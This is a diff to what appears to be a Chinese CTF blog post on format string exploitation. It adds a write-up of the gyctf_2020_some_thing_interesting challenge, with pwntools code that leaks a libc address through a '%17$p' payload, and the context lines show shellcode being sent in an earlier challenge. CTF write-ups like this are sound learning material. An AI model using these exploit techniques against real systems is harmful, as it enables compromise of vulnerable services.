@@ -6,9 +6,9 @@ categories: [ctf-pwn]
 excerpt: xctf-pwn string
 ---
 
-![](/img/FormatString/1.png)
-
 #### xctf string
+
+![](/img/FormatString/1.png)
 
 简单的格式化字符串
 
@@ -71,4 +71,33 @@ p.sendline(shellcode)
 
 p.interactive()
 ```
+
+
+
+#### gyctf_2020_some_thing_interesting
+
+<https://buuoj.cn/challenges#gyctf_2020_some_thing_interesting>
+
+本地运行不起来，不知道是什么原因。
+
+直接在栈上泄露返回`__libc_start_main`的偏移地址，算出libc
+
+参考 <https://blog.csdn.net/mcmuyanga/article/details/114643601>
+
+![](/img/FormatString/2.jpg)
+
+```python
+r.recvuntil("> Input your code please:")
+r.sendline("OreOOrereOOreO%17$p")	#elf 11 libc 17
+
+r.recvuntil("#######################\n")
+r.sendline('0')
+r.recvuntil("# Your Code is ")
+r.recvuntil('0x')
+
+start_main = int(r.recv(12), 16) - 0xf0
+libc.address = start_main - libc.sym['__libc_start_main']
+```
+
+
 
